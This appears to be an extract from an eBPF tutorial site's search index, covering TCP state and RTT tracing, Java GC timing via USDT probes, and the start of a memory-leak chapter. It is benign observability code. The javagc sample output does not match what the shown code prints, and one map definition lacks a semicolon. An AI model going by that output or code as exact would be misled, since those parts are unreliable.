<code>sports</code> and <code>dports</code> are used to store the source and destination ports for filtering TCP connections; <code>timestamps</code> is used to store the timestamps for each TCP connection to calculate the time spent in each state; <code>events</code> is a map of type <code>perf_event</code>, used to send event data to the user-space.</p>"},{"location":"tutorials/14-tcpstates/#trace-tcp-connection-state-changes","title":"Trace TCP Connection State Changes","text":"<p>The program defines a function called <code>handle_set_state</code>, which is a program of type tracepoint and is mounted on the <code>sock/inet_sock_set_state</code> kernel tracepoint. Whenever the TCP connection state changes, this tracepoint is triggered and the <code>handle_set_state</code> function is executed.</p> <p>In the <code>handle_set_state</code> function, it first determines whether the current TCP connection needs to be processed through a series of conditional judgments, then retrieves the previous timestamp of the current connection from the <code>timestamps</code> map, and calculates the time spent in the current state. Then, the program places the collected data in an event structure and sends the event to the user-space using the <code>bpf_perf_event_output</code> function.</p>"},{"location":"tutorials/14-tcpstates/#update-timestamps","title":"Update Timestamps","text":"<p>Finally, based on the new state of the TCP connection, the program performs different operations: if the new state is TCP_CLOSE, it means the connection has been closed and the program deletes the timestamp of that connection from the <code>timestamps</code> map; otherwise, the program updates the timestamp of the connection.</p>"},{"location":"tutorials/14-tcpstates/#user-space-processing-for-tcpstate","title":"User-Space Processing for tcpstate","text":"<p>The user-space part is mainly about loading the eBPF program using libbpf and receiving event data from the kernel using perf_event:</p> <pre><code>static void handle_event(void* ctx, int cpu, void* data, __u32 data_sz) {\n    char ts[32], saddr[26], daddr[26];\n    struct event* e = data;\n    struct tm* tm;\n    int family;\n    time_t t;\n\n    if (emit_timestamp) {\n        time(&amp;t);\n        tm = localtime(&amp;t);\n        strftime(ts, sizeof(ts), \"%H:%M:%S\", tm);\n        printf(\"%8s \", ts);\n    }\n\n    inet_ntop(e-&gt;family, &amp;e-&gt;saddr, saddr, sizeof(saddr));\n    inet_ntop(e-&gt;family, &amp;e-&gt;daddr, daddr, sizeof(daddr));\n    if (wide_output) {\n        family = e-&gt;family == AF_INET ? 4 : 6;\n        printf(\n            \"%-16llx %-7d %-16s %-2d %-26s %-5d %-26s %-5d %-11s -&gt; %-11s \"\n            \"%.3f\\n\",\n            e-&gt;skaddr, e-&gt;pid, e-&gt;task, family, saddr, e-&gt;sport, daddr,\n            e-&gt;dport, tcp_states[e-&gt;oldstate], tcp_states[e-&gt;newstate],\n            (double)e-&gt;delta_us / 1000);\n    } else {\n        printf(\n            \"%-16llx %-7d %-10.10s %-15s %-5d %-15s %-5d %-11s -&gt; %-11s %.3f\\n\",\n    ...\n</code></pre> <p>handle_event` is a callback function that is called by perf_event. It handles new events that arrive in the kernel.</p> <p>In the <code>handle_event</code> function, we first use the <code>inet_ntop</code> function to convert the binary IP address to a human-readable format. Then, based on whether the wide format is needed or not, we print different information. This information includes the timestamp of the event, source IP address, source port, destination IP address, destination port, old state, new state, and the time spent in the old state.</p> <p>This allows users to see the changes in TCP connection states and the duration of each state, helping them diagnose network issues.</p> <p>In summary, the user-space part of the processing involves the following steps:</p> <ol> <li>Use libbpf to load and run the eBPF program.</li> <li>Set up a callback function to receive events sent by the kernel.</li> <li>Process the received events, convert them into a human-readable format, and print them.</li> </ol> <p>The above is the main implementation logic of the user-space part of the <code>tcpstates</code> program. Through this chapter, you should have gained a deeper understanding of how to handle kernel events in user space. In the next chapter, we will introduce more knowledge about using eBPF for network monitoring.</p>"},{"location":"tutorials/14-tcpstates/#tcprtt-kernel-ebpf-code","title":"tcprtt kernel eBPF code","text":"<p>In this section, we will analyze the kernel BPF code of the <code>tcprtt</code> eBPF program. <code>tcprtt</code> is a program used to measure TCP Round Trip Time (RTT) and stores the RTT information in a histogram.</p> <pre><code>/// @sample {\"interval\": 1000, \"type\" : \"log2_hist\"}\nstruct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, MAX_ENTRIES);\n    __type(key, u64);\n    __type(value, struct hist);\n} hists SEC(\".maps\");\n\nstatic struct hist zero;\n\nSEC(\"fentry/tcp_rcv_established\")\nint BPF_PROG(tcp_rcv, struct sock *sk)\n{\n    const struct inet_sock *inet = (struct inet_sock *)(sk);\n    struct tcp_sock *ts;\n    struct hist *histp;\n    u64 key, slot;\n    u32 srtt;\n\n    if (targ_sport &amp;&amp; targ_sport != inet-&gt;inet_sport)\n        return 0;\n    if (targ_dport &amp;&amp; targ_dport != sk-&gt;__sk_common.skc_dport)\n        return 0;\n    if (targ_saddr &amp;&amp; targ_saddr != inet-&gt;inet_saddr)\n        return 0;\n    if (targ_daddr &amp;&amp; targ_daddr != sk-&gt;__sk_common.skc_daddr)\n        return 0;\n\n    if (targ_laddr_hist)\n        key = inet-&gt;inet_saddr;\n    else if (targ_raddr_hist)\n        key = inet-&gt;sk.__sk_common.skc_daddr;\n    else\n        key = 0;\n    histp = bpf_map_lookup_or_try_init(&amp;hists, &amp;key, &amp;zero);\n    if (!histp)\n        return 0;\n    ts = (struct tcp_sock *)(sk);\n    srtt = BPF_CORE_READ(ts, srtt_us) &gt;&gt; 3;\n    if (targ_ms)\n        srtt /= 1000U;\n    slot = log2l(srtt);\n    if (slot &gt;= MAX_SLOTS)\n        slot = MAX_SLOTS - 1;\n    __sync_fetch_and_add(&amp;histp-&gt;slots[slot], 1);\n    if (targ_show_ext) {\n        __sync_fetch_and_add(&amp;histp-&gt;latency, srtt);\n        __sync_fetch_and_add(&amp;histp-&gt;cnt, 1);\n    }\n    return 0;\n}\n</code></pre> <p>The code above declares a map called <code>hists</code>, which is a hash map used to store the histogram data. The <code>hists</code> map has a maximum number of entries defined as <code>MAX_ENTRIES</code>.</p> <p>The function <code>BPF_PROG(tcp_rcv, struct sock *sk)</code> is the entry point of the eBPF program for handling the <code>tcp_rcv_established</code> event. Within this function, the program retrieves various information from the network socket and checks if filtering conditions are met. Then, it performs operations on the histogram data structure. Finally, the program calculates the slot for the RTT value and updates the histogram accordingly.</p> <p>This is the main code logic of the <code>tcprtt</code> eBPF program in kernel mode. The eBPF program measures the RTT of TCP connections and maintains a histogram to collect and analyze the RTT data.Instructions:</p> <p>First, we define a hash type eBPF map called <code>hists</code>, which is used to store statistics information about RTT. In this map, the key is a 64-bit integer, and the value is a <code>hist</code> structure that contains an array to store the count of different RTT intervals.</p> <p>Next, we define an eBPF program called <code>tcp_rcv</code> which will be called every time a TCP packet is received in the kernel. In this program, we first filter TCP connections based on filtering conditions (source/destination IP address and port). If the conditions are met, we select the corresponding key (source IP, destination IP, or 0) based on the set parameters, and then look up or initialize the corresponding histogram in the <code>hists</code> map.</p> <p>Then, we read the <code>srtt_us</code> field of the TCP connection, which represents the smoothed RTT value in microseconds. We convert this RTT value to a logarithmic form and store it as a slot in the histogram.</p> <p>If the <code>show_ext</code> parameter is set, we also increment the RTT value and the counter in the <code>latency</code> and <code>cnt</code> fields of the histogram.</p> <p>With the above processing, we can analyze and track the RTT of each TCP connection to better understand the network performance.</p> <p>In summary, the main logic of the <code>tcprtt</code> eBPF program includes the following steps:</p> <ol> <li>Filter TCP connections based on filtering conditions.</li> <li>Look up or initialize the corresponding histogram in the <code>hists</code> map.</li> <li>Read the <code>srtt_us</code> field of the TCP connection, convert it to a logarithmic form, and store it in the histogram.</li> <li>If the <code>show_ext</code> parameter is set, increment the RTT value and the counter in the <code>latency</code> and <code>cnt</code> fields of the histogram.</li> </ol> <p><code>tcprtt</code> is attached to the kernel's <code>tcp_rcv_established</code> function:</p> <pre><code>void tcp_rcv_established(struct sock *sk, struct sk_buff *skb);\n</code></pre> <p>This function is the main function in the kernel for processing received TCP data and is called when a TCP connection is in the <code>ESTABLISHED</code> state. The processing logic of this function includes a fast path and a slow path. The fast path is disabled in the following cases:</p> <ul> <li>We have advertised a zero window - zero window probing can only be handled correctly in the slow path.</li> <li>Out-of-order data packets received.</li> <li>Expecting to receive urgent data.</li> <li>No remaining buffer space.</li> <li>Received unexpected TCP flags/window values/header lengths (detected by checking TCP header against the expected flags).</li> <li>Data is being transmitted in both directions. The fast path only supports pure senders or pure receivers (meaning the sequence number or acknowledgement value must remain unchanged).</li> <li>Received unexpected TCP options.</li> </ul> <p>When these conditions are not met, it enters a standard receive processing, which follows RFC 793 to handle all cases. The first three cases can be ensured by setting the correct expected flags, while the remaining cases require inline checks. When everything is normal, the fast processing path is invoked in the <code>tcp_data_queue</code> function.</p>"},{"location":"tutorials/14-tcpstates/#compilation-and-execution","title":"Compilation and Execution","text":"<p>For <code>tcpstates</code>, you can compile and run the libbpf application with the following command:</p> <pre><code>$ make\n...\n  BPF      .output/tcpstates.bpf.o\n  GEN-SKEL .output/tcpstates.skel.h\n  CC       .output/tcpstates.o\n  BINARY   tcpstates\n$ sudo ./tcpstates \nSKADDR           PID     COMM       LADDR           LPORT RADDR           RPORT OLDSTATE    -&gt; NEWSTATE    MS\nffff9bf61bb62bc0 164978  node       192.168.88.15   0     52.178.17.2     443   CLOSE       -&gt; SYN_SENT    0.000\nffff9bf61bb62bc0 0       swapper/0  192.168.88.15   41596 52.178.17.2     443   SYN_SENT    -&gt; ESTABLISHED 225.794\".\n\"ffff9bf61bb62bc0 0       swapper/0  192.168.88.15   41596 52.178.17.2     443   ESTABLISHED -&gt; CLOSE_WAIT  901.454\nffff9bf61bb62bc0 164978  node       192.168.88.15   41596 52.178.17.2     443   CLOSE_WAIT  -&gt; LAST_ACK    0.793\nffff9bf61bb62bc0 164978  node       192.168.88.15   41596 52.178.17.2     443   LAST_ACK    -&gt; LAST_ACK    0.086\nffff9bf61bb62bc0 228759  kworker/u6 192.168.88.15   41596 52.178.17.2     443   LAST_ACK    -&gt; CLOSE       0.193\nffff9bf6d8ee88c0 229832  redis-serv 0.0.0.0         6379  0.0.0.0         0     CLOSE       -&gt; LISTEN      0.000\nffff9bf6d8ee88c0 229832  redis-serv 0.0.0.0         6379  0.0.0.0         0     LISTEN      -&gt; CLOSE       1.763\nffff9bf7109d6900 88750   node       127.0.0.1       39755 127.0.0.1       50966 ESTABLISHED -&gt; FIN_WAIT1   0.000\n</code></pre> <p>For tcprtt, we can use eunomia-bpf to compile and run this example:</p> <p>Compile:</p> <pre><code>docker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest\n</code></pre> <p>Or</p> <pre><code>$ ecc tcprtt.bpf.c tcprtt.h\nCompiling bpf object...\nGenerating export types...\nPacking ebpf object and config into package.json...\n</code></pre> <p>Run:</p> <pre><code>$ sudo ecli run package.json -h\nA simple eBPF program\n\nUsage: package.json [OPTIONS]\n\nOptions:\n      --verbose                  Whether to show libbpf debug information\n      --targ_laddr_hist          Set value of `bool` variable targ_laddr_hist\n      --targ_raddr_hist          Set value of `bool` variable targ_raddr_hist\n      --targ_show_ext            Set value of `bool` variable targ_show_ext\n      --targ_sport &lt;targ_sport&gt;  Set value of `__u16` variable targ_sport\n      --targ_dport &lt;targ_dport&gt;  Set value of `__u16` variable targ_dport\n      --targ_saddr &lt;targ_saddr&gt;  Set value of `__u32` variable targ_saddr\n      --targ_daddr &lt;targ_daddr&gt;  Set value of `__u32` variable targ_daddr\n      --targ_ms                  Set value of `bool` variable targ_ms\n  -h, --help                     Print help\n  -V, --version                  Print version\n\nBuilt with eunomia-bpf framework.\".\n```See https://github.com/eunomia-bpf/eunomia-bpf for more information.\n\n$ sudo ecli run package.json\nkey =  0\nlatency = 0\ncnt = 0\n\n     (unit)              : count    distribution\n         0 -&gt; 1          : 0        |                                        |\n         2 -&gt; 3          : 0        |                                        |\n         4 -&gt; 7          : 0        |                                        |\n         8 -&gt; 15         : 0        |                                        |\n        16 -&gt; 31         : 0        |                                        |\n        32 -&gt; 63         : 0        |                                        |\n        64 -&gt; 127        : 0        |                                        |\n       128 -&gt; 255        : 0        |                                        |\n       256 -&gt; 511        : 0        |                                        |\n       512 -&gt; 1023       : 4        |********************                    |\n      1024 -&gt; 2047       : 1        |*****                                   |\n      2048 -&gt; 4095       : 0        |                                        |\n      4096 -&gt; 8191       : 8        |****************************************|\n\nkey =  0\nlatency = 0\ncnt = 0\n\n     (unit)              : count    distribution\n         0 -&gt; 1          : 0        |                                        |\n         2 -&gt; 3          : 0        |                                        |\n         4 -&gt; 7          : 0        |                                        |\n         8 -&gt; 15         : 0        |                                        |\n        16 -&gt; 31         : 0        |                                        |\n        32 -&gt; 63         : 0        |                                        |\n        64 -&gt; 127        : 0        |                                        |\n       128 -&gt; 255        : 0        |                                        |\n       256 -&gt; 511        : 0        |                                        |512 -&gt; 1023       : 11       |***************************             |\n      1024 -&gt; 2047       : 1        |**                                      |\n      2048 -&gt; 4095       : 0        |                                        |\n      4096 -&gt; 8191       : 16       |****************************************|\n      8192 -&gt; 16383      : 4        |**********                              |\n</code></pre> <p>Complete source code:</p> <ul> <li>https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/14-tcpstates</li> </ul> <p>References:</p> <ul> <li>tcpstates</li> <li>tcprtt</li> <li>libbpf-tools/tcpstates</li> </ul>"},{"location":"tutorials/14-tcpstates/#summary","title":"Summary","text":"<p>In this eBPF introductory tutorial, we learned how to use the tcpstates and tcprtt eBPF example programs to monitor and analyze the connection states and round-trip time of TCP. We understood the working principles and implementation methods of tcpstates and tcprtt, including how to store data using BPF maps, how to retrieve and process TCP connection information in eBPF programs, and how to parse and display the data collected by eBPF programs in user-space applications.</p> <p>If you would like to learn more about eBPF knowledge and practices, you can visit our tutorial code repository at https://github.com/eunomia-bpf/bpf-developer-tutorial or website https://eunomia.dev/tutorials/ for more examples and complete tutorials. The upcoming tutorials will further explore advanced features of eBPF, and we will continue to share more content about eBPF development practices.</p> <p>The original link of this article: https://eunomia.dev/tutorials/14-tcpstates</p> <p>Share on  Share on </p>"},{"location":"tutorials/15-javagc/","title":"eBPF Tutorial by Example 15: Capturing User-Space Java GC Duration Using USDT","text":"<p>eBPF (Extended Berkeley Packet Filter) is a powerful network and performance analysis tool widely used in the Linux kernel. eBPF allows developers to dynamically load, update, and run user-defined code without the need to restart the kernel or modify the kernel source code. This feature provides eBPF with high flexibility and performance, making it widely applicable in network and system performance analysis. Furthermore, eBPF also supports capturing user-space application behavior using User-Level Statically Defined Tracing (USDT).</p> <p>In this article of our eBPF Tutorial by Example series, we will explore how to use eBPF and USDT to capture and analyze the duration of Java garbage collection (GC) events.</p>"},{"location":"tutorials/15-javagc/#introduction-to-usdt","title":"Introduction to USDT","text":"<p>USDT is a mechanism for inserting static tracepoints into applications, allowing developers to insert probes at critical points in the program for debugging and performance analysis purposes. These probes can be dynamically activated at runtime by tools such as DTrace, SystemTap, or eBPF, allowing access to the program's internal state and performance metrics without the need to restart the application or modify the program code. USDT is widely used in many open-source software applications such as MySQL, PostgreSQL, Ruby, Python, and Node.js.</p>"},{"location":"tutorials/15-javagc/#user-level-tracing-mechanism-user-level-dynamic-tracing-and-usdt","title":"User-Level Tracing Mechanism: User-Level Dynamic Tracing and USDT","text":"<p>User-Level Dynamic Tracing allows us to instrument any user-level code by placing probes. For example, we can trace query requests in a MySQL server by placing a probe on the <code>dispatch_command()</code> function:</p> <pre><code># ./uprobe 'p:cmd /opt/bin/mysqld:_Z16dispatch_command19enum_server_commandP3THDPcj +0(%dx):string'\nTracing uprobe cmd (p:cmd /opt/bin/mysqld:0x2dbd40 +0(%dx):string). Ctrl-C to end.\n  mysqld-2855  [001] d... 19957757.590926: cmd: (0x6dbd40) arg1=\"show tables\"\n  mysqld-2855  [001] d... 19957759.703497: cmd: (0x6dbd40) arg1=\"SELECT * FROM numbers\"\n[...]\n</code></pre> <p>Here, we use the <code>uprobe</code> tool, which leverages Linux's built-in functionalities: ftrace (tracing framework) and uprobes (User-Level Dynamic Tracing, requires a relatively new Linux version, around 4.0 or later). Other tracing frameworks such as perf_events and SystemTap can also achieve this functionality.</p> <p>Many other MySQL functions can be traced to obtain more information. We can list and count the number of these functions:</p> <pre><code># ./uprobe -l /opt/bin/mysqld | more\naccount_hash_get_key\nadd_collation\nadd_compiled_collation\nadd_plugin_noargs\nadjust_time_range\n[...]\n# ./uprobe -l /opt/bin/mysqld | wc -l\n21809\n</code></pre> <p>There are 21,000 functions here. We can also trace library functions or even individual instruction offsets.</p> <p>User-Level Dynamic Tracing capability is very powerful and can solve numerous problems. However, using it also has some challenges: identifying the code to trace, handling function parameters, and dealing with code modifications.</p> <p>User-Level Statically Defined Tracing (USDT) can address some of these challenges. USDT probes (or \"markers\" at the user level) are trace macros inserted at critical positions in the code, providing a stable and well-documented API. This makes the tracing work simpler.</p> <p>With USDT, we can easily trace a probe called <code>mysql:query__start</code> instead of tracing the C++ symbol <code>_Z16dispatch_command19enum_server_commandP3THDPcj</code>, which is the <code>dispatch_command()</code> function. Of course, we can still trace <code>dispatch_command()</code> and the other 21,000 mysqld functions when needed, but only when USDT probes cannot solve the problem.In Linux, USDT (User Statically Defined Tracing) has actually existed in various forms for decades. It has recently gained attention again due to the popularity of Sun's DTrace tool, which has led to many common applications, including MySQL, PostgreSQL, Node.js, Java, etc., adding USDT support. SystemTap has developed a way to consume these DTrace probes.</p> <p>You may be running a Linux application that already includes USDT probes, or you may need to recompile it (usually with --enable-dtrace). You can use <code>readelf</code> to check, for example, for Node.js:</p> <pre><code># readelf -n node\n[...]\nNotes at offset 0x00c43058 with length 0x00000494:\n  Owner                 Data size   Description\n  stapsdt              0x0000003c   NT_STAPSDT (SystemTap probe descriptors)\n    Provider: node\n    Name: gc__start\n    Location: 0x0000000000bf44b4, Base: 0x0000000000f22464, Semaphore: 0x0000000001243028\n    Arguments: 4@%esi 4@%edx 8@%rdi\n[...]\n  stapsdt              0x00000082       NT_STAPSDT (SystemTap probe descriptors)\n    Provider: node\n    Name: http__client__request\n    Location: 0x0000000000bf48ff, Base: 0x0000000000f22464, Semaphore: 0x0000000001243024\n    Arguments: 8@%rax 8@%rdx 8@-136(%rbp) -4@-140(%rbp) 8@-72(%rbp) 8@-80(%rbp) -4@-144(%rbp)\n[...]\n</code></pre> <p>This is a Node.js recompiled with --enable-dtrace and installed with the systemtap-sdt-dev package that provides \"dtrace\" functionality to support USDT. Here are two probes displayed: node:gc__start (garbage collection start) and node:http__client__request.</p> <p>At this point, you can use SystemTap or LTTng to trace these probes. However, built-in Linux tracers like ftrace and perf_events currently cannot do this (although perf_events support is under development).</p>"},{"location":"tutorials/15-javagc/#introduction-to-java-gc","title":"Introduction to Java GC","text":"<p>Java, as a high-level programming language, has automatic garbage collection (GC) as one of its core features. The goal of Java GC is to automatically reclaim memory space that is no longer used by the program, thereby relieving programmers of the burden of memory management. However, the GC process may cause application pauses, which can impact program performance and response time. Therefore, monitoring and analyzing Java GC events are essential for understanding and optimizing the performance of Java applications.</p> <p>In the following tutorial, we will demonstrate how to use eBPF and USDT to monitor and analyze the duration of Java GC events. We hope this content will be helpful to you in your work with eBPF for application performance analysis.</p> <p>USDT in kernel mode eBPF runtime may also cause relatively large performance overhead. In this case, you can also consider using user mode eBPF runtime, such as bpftime. bpftime is a user mode eBPF runtime based on LLVM JIT/AOT. It can run eBPF programs in user mode and is compatible with kernel mode eBPF, avoiding context switching between kernel mode and user mode, thereby improving the execution efficiency of eBPF programs by 10 times.</p>"},{"location":"tutorials/15-javagc/#ebpf-implementation-mechanism","title":"eBPF Implementation Mechanism","text":"<p>The eBPF program for Java GC is divided into two parts: kernel space and user space. We will introduce the implementation mechanisms of these two parts separately.</p>"},{"location":"tutorials/15-javagc/#kernel-space-program","title":"Kernel Space Program","text":"<pre><code>/* SPDX-License-Identifier: (LGPL-2.1 OR BSD-2-Clause) */\n/* Copyright (c) 2022 Chen Tao */\n#include &lt;vmlinux.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_core_read.h&gt;\n#include &lt;bpf/usdt.bpf.h&gt;\n#include \"javagc.h\"\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, 100);\n    __type(key, uint32_t);\n    __type(value, struct data_t);\n} data_map SEC(\".maps\");\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY)\n    __type(key, int);\n    __type(value, int);\n} perf_map SEC(\".maps\");\n\n__u32 time;\n\nstatic int gc_start(struct pt_regs *ctx)\n{\n    struct data_t data = {};\n\n    data.cpu = bpf_get_smp_processor_id();\n    data.pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n    data.ts = bpf_ktime_get_ns();\n    bpf_map_update_elem(&amp;data_map, &amp;data.pid, &amp;data, 0);\n    return 0;\n}\n\nstatic int gc_end(struct pt_regs *ctx)\n{\n    struct data_t data = {};\n    struct data_t *p;\n    __u32 val;\n\n    data.cpu = bpf_get_smp_processor_id();\n    data.pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n    data.ts = bpf_ktime_get_ns();\n    p = bpf_map_lookup_elem(&amp;data_map, &amp;data.pid);\n    if (!p)\n        return 0;\n\n    val = data.ts - p-&gt;ts;\n    if (val &gt; time) {\n        data.ts = val;\n        bpf_perf_event_output(ctx, &amp;perf_map, BPF_F_CURRENT_CPU, &amp;data, sizeof(data));\n    }\n    bpf_map_delete_elem(&amp;data_map, &amp;data.pid);\n    return 0;\n}\n\nSEC(\"usdt\")\nint handle_gc_start(struct pt_regs *ctx)\n{\n    return gc_start(ctx);\n}\n\nSEC(\"usdt\")\nint handle_gc_end(struct pt_regs *ctx)\n{\n    return gc_end(ctx);\n}\n\nSEC(\"usdt\")\nint handle_mem_pool_gc_start(struct pt_regs *ctx)\n{\n    return gc_start(ctx);\n}\n\nSEC(\"usdt\")\nint handle_mem_pool_gc_end(struct pt_regs *ctx)\n{\n    return gc_end(ctx);\n}\n\nchar LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n</code></pre> <p>First, we define two maps:</p> <ul> <li><code>data_map</code>: This hashmap stores the start time of garbage collection for each process ID. The <code>data_t</code> structure contains the process ID, CPU ID, and timestamp.</li> <li><code>perf_map</code>: This is a perf event array used to send data back to the user-space program.</li> </ul> <p>Then, we have four handler functions: <code>gc_start</code>, <code>gc_end</code>, and two USDT handler functions <code>handle_mem_pool_gc_start</code> and <code>handle_mem_pool_gc_end</code>. These functions are all annotated with the BPF <code>SEC(\"usdt\")</code> macro to capture USDT events related to garbage collection in a Java process.</p> <p>The <code>gc_start</code> function is called when garbage collection starts. It first gets the current CPU ID, process ID, and timestamp, and then stores this data in <code>data_map</code>.</p> <p>The <code>gc_end</code> function is called when garbage collection ends. It performs similar operations as <code>gc_start</code>, but it also retrieves the start time from <code>data_map</code> and calculates the duration of garbage collection. If the duration exceeds a set threshold (<code>time</code> variable), it sends the data back to the user-space program.</p> <p><code>handle_gc_start</code> and <code>handle_gc_end</code> are handler functions for the garbage collection start and end events, respectively, and they call <code>gc_start</code> and <code>gc_end</code>, respectively.</p> <p><code>handle_mem_pool_gc_start</code> and <code>handle_mem_pool_gc_end</code> are handler functions for the garbage collection start and end events in the memory pool, and they also call <code>gc_start</code> and <code>gc_end</code>, respectively.Finally, we have a <code>LICENSE</code> array that declares the license of the BPF program, which is required for loading the BPF program.</p>"},{"location":"tutorials/15-javagc/#user-space-program","title":"User-space Program","text":"<p>The main goal of the user-space program is to load and run eBPF programs, as well as process data from the kernel-space program. This is achieved through the use of the libbpf library. Here, we are omitting some common code for loading and running eBPF programs and only showing the parts related to USDT.</p> <p>The first function <code>get_jvmso_path</code> is used to obtain the path of the <code>libjvm.so</code> library for the running Java Virtual Machine (JVM). First, it opens the <code>/proc/&lt;pid&gt;/maps</code> file, which contains the memory mapping information of the process address space. Then, it searches for the line that contains <code>libjvm.so</code> in the file and copies the path of that line to the provided argument.</p> <pre><code>static int get_jvmso_path(char *path)\n{\n    char mode[16], line[128], buf[64];\n    size_t seg_start, seg_end, seg_off;\n    FILE *f;\n    int i = 0;\n\n    sprintf(buf, \"/proc/%d/maps\", env.pid);\n    f = fopen(buf, \"r\");\n    if (!f)\n        return -1;\n\n    while (fscanf(f, \"%zx-%zx %s %zx %*s %*d%[^\\n]\\n\",\n            &amp;seg_start, &amp;seg_end, mode, &amp;seg_off, line) == 5) {\n        i = 0;\n        while (isblank(line[i]))\n            i++;\n        if (strstr(line + i, \"libjvm.so\")) {\n            break;\n        }\n    }\n\n    strcpy(path, line + i);\n    fclose(f);\n\n    return 0;\n}\n</code></pre> <p>Next, we see the attachment of the eBPF programs (<code>handle_gc_start</code> and <code>handle_gc_end</code>) to the relevant USDT probes in the Java process. Each program achieves this by calling the <code>bpf_program__attach_usdt</code> function, which takes as parameters the BPF program, the process ID, the binary path, and the provider and name of the probe. If the probe is successfully attached, <code>bpf_program__attach_usdt</code> will return a link object, which is stored in the skeleton's link member. If the attachment fails, the program will print an error message and perform cleanup.</p> <pre><code>    skel-&gt;links.handle_mem_pool_gc_start = bpf_program__attach_usdt(skel-&gt;progs.handle_gc_start, env.pid,\n                                    binary_path, \"hotspot\", \"mem__pool__gc__begin\", NULL);\n    if (!skel-&gt;links.handle_mem_pool_gc_start) {\n        err = errno;\n        fprintf(stderr, \"attach usdt mem__pool__gc__begin failed: %s\\n\", strerror(err));\n        goto cleanup;\n    }\n\n    skel-&gt;links.handle_mem_pool_gc_end = bpf_program__attach_usdt(skel-&gt;progs.handle_gc_end, env.pid,\n                                binary_path, \"hotspot\", \"mem__pool__gc__end\", NULL);\n    if (!skel-&gt;links.handle_mem_pool_gc_end) {\n        err = errno;\n        fprintf(stderr, \"attach usdt mem__pool__gc__end failed: %s\\n\", strerror(err));\n        goto cleanup;\n    }\n\n    skel-&gt;links.handle_gc_start = bpf_program__attach_usdt(skel-&gt;progs.handle_gc_start, env.pid,\nbinary_path, \"hotspot\", \"gc__begin\", NULL);\n    if (!skel-&gt;links.handle_gc_start) {\n        err = errno;\n        fprintf(stderr, \"attach usdt gc__begin failed: %s\\n\", strerror(err));\n        goto cleanup;\n    }\n\n    skel-&gt;links.handle_gc_end = bpf_program__attach_usdt(skel-&gt;progs.handle_gc_end, env.pid,\n                binary_path, \"hotspot\", \"gc__end\", NULL);\n    if (!skel-&gt;links.handle_gc_end) {\n        err = errno;\n        fprintf(stderr, \"attach usdt gc__end failed: %s\\n\", strerror(err));\n        goto cleanup;\n    }\n</code></pre> <p>The last function <code>handle_event</code> is a callback function used to handle data received from the perf event array. This function is triggered by the perf event array and is called each time a new event is received. The function first converts the data to a <code>data_t</code> structure, then formats the current time as a string, and finally prints the timestamp, CPU ID, process ID, and duration of the garbage collection.</p> <pre><code>static void handle_event(void *ctx, int cpu, void *data, __u32 data_sz)\n{\n    struct data_t *e = (struct data_t *)data;\n    struct tm *tm = NULL;\n    char ts[16];\n    time_t t;\n\n    time(&amp;t);\n    tm = localtime(&amp;t);\n    strftime(ts, sizeof(ts), \"%H:%M:%S\", tm);\n    printf(\"%-8s %-7d %-7d %-7lld\\n\", ts, e-&gt;cpu, e-&gt;pid, e-&gt;ts/1000);\n}\n</code></pre>"},{"location":"tutorials/15-javagc/#installing-dependencies","title":"Installing Dependencies","text":"<p>To build the example, you need clang, libelf, and zlib. The package names may vary with different distributions.</p> <p>On Ubuntu/Debian, run the following command:</p> <pre><code>sudo apt install clang libelf1 libelf-dev zlib1g-dev\n</code></pre> <p>On CentOS/Fedora, run the following command:</p> <pre><code>sudo dnf install clang elfutils-libelf elfutils-libelf-devel zlib-devel\n</code></pre>"},{"location":"tutorials/15-javagc/#compiling-and-running","title":"Compiling and Running","text":"<p>In the corresponding directory, run Make to compile and run the code:</p> <pre><code>$ make\n$ sudo ./javagc -p 12345\nTracing javagc time... Hit Ctrl-C to end.\nTIME     CPU     PID     GC TIME\n10:00:01 10%     12345   50ms\n10:00:02 12%     12345   55ms\n10:00:03 9%      12345   47ms\n10:00:04 13%     12345   52ms\n10:00:05 11%     12345   50ms\n</code></pre> <p>Complete source code:</p> <ul> <li>https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/15-javagc</li> </ul> <p>References:</p> <ul> <li>https://www.brendangregg.com/blog/2015-07-03/hacking-linux-usdt-ftrace.html</li> <li>https://github.com/iovisor/bcc/blob/master/libbpf-tools/javagc.c</li> </ul> <p>Summary.Through this introductory eBPF tutorial, we have learned how to use eBPF and USDT for dynamic tracing and analysis of Java garbage collection (GC) events. We have understood how to set USDT tracepoints in user space applications and how to write eBPF programs to capture information from these tracepoints, thereby gaining a deeper understanding and optimizing the behavior and performance of Java GC.</p> <p>Additionally, we have also introduced some basic knowledge and practical techniques related to Java GC, USDT, and eBPF. This knowledge and skills are valuable for developers who want to delve into the field of network and system performance analysis.</p> <p>If you would like to learn more about eBPF knowledge and practices, you can visit our tutorial code repository at https://github.com/eunomia-bpf/bpf-developer-tutorial or website https://eunomia.dev/tutorials/ to get more examples and the complete tutorial.</p> <p>Share on  Share on </p>"},{"location":"tutorials/16-memleak/","title":"eBPF Tutorial by Example 16: Monitoring Memory Leaks","text":"<p>eBPF (extended Berkeley Packet Filter) is a powerful network and performance analysis tool that is widely used in the Linux kernel. eBPF allows developers to dynamically load, update, and run user-defined code without restarting the kernel or modifying its source code.</p> <p>In this tutorial, we will explore how to write a Memleak program using eBPF to monitor memory leaks in programs.</p>"},{"location":"tutorials/16-memleak/#background-and-importance","title":"Background and Importance","text":"<p>Memory leaks are a common problem in computer programming and should not be underestimated. When memory leaks occur, programs gradually consume more memory resources without properly releasing them. Over time, this behavior can lead to a gradual depletion of system memory, significantly reducing the overall performance of the program and system.</p> <p>There are many possible causes of memory leaks. It may be due to misconfiguration, such as a program incorrectly configuring dynamic allocation of certain resources. It may also be due to software bugs or incorrect memory management strategies, such as forgetting to release memory that is no longer needed during program execution. Additionally, if an application's memory usage is too high, system performance may significantly decrease due to paging/swapping, or it may even cause the application to be forcibly terminated by the system's OOM killer (Out of Memory Killer).</p>"},{"location":"tutorials/16-memleak/#challenges-of-debugging-memory-leaks","title":"Challenges of 